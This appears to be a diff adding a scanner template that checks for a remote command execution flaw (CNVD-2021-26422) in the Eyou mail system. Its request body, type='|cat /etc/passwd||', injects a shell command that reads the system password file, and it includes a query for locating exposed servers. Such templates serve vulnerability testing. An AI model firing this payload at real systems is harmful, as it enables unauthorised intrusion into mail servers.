@@ -1,0 +1,20 @@
+name: Eyou Mail System RCE CNVD-2021-26422
+manual: true
+query: app="Eyou-Mail-system"
+transport: http
+rules:
+  r0:
+    request:
+      method: POST
+      path: /webadm/?q=moni_detail.do&action=gragh
+      headers:
+        Content-Type: application/x-www-form-urlencoded
+      body: type='|cat /etc/passwd||'
+    expression: response.status == 200 && response.body.bcontains(b"root")
+expression: r0()
+detail:
+  links:
+  - https://www.cnvd.org.cn/flaw/show/CNVD-2021-26422
+  description: Beijing Yizhongyou Information Technology Co., Ltd. (Yiyou) is a professional
+    mail system software and overall solution provider.
+  tags: RCE
